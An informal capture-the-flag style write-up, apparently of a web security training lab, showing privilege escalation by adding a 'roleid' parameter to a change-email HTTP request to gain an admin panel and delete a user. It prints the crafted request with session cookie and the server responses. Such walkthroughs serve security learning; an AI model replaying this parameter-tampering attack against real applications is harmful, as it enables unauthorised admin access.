this one is little bit fun. some how and some way you should change the user roleid and then again say goodbye to Carlos.
based on the title you can change in the roldid in the profile, but there is nothing there lets change the email the only thing that we can change. and boom when we send the request for changing the email we get this response:
```HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 121

{
  "username": "wiener",
  "email": "nothing@gmail.com",
  "apikey": "5aXZfjUbmZ9MiR6MEz5sfj9ohNB4BlIA",
  "roleid": 1
}
```
so now what is we can add roleid into the change email request? lets test it, send the request to repeater and try again :
```
POST /my-account/change-email HTTP/2
Host: 0a9d000d03b762db868793ac007b00c3.web-security-academy.net
Cookie: session=cfnmdomQa9PoMPgar88FbBCeRFsuyiFC
Content-Length: 42
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="149", "Not)A;Brand";v="24"
Content-Type: text/plain;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a9d000d03b762db868793ac007b00c3.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a9d000d03b762db868793ac007b00c3.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"email":"nothing@gmail.com",
"roleid":2}
```
and done we get this response :
```
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 121

{
  "username": "wiener",
  "email": "nothing@gmail.com",
  "apikey": "5aXZfjUbmZ9MiR6MEz5sfj9ohNB4BlIA",
  "roleid": 2
}
```
now when we refresh our page in the browser we get admin panel and we can delete Carlos.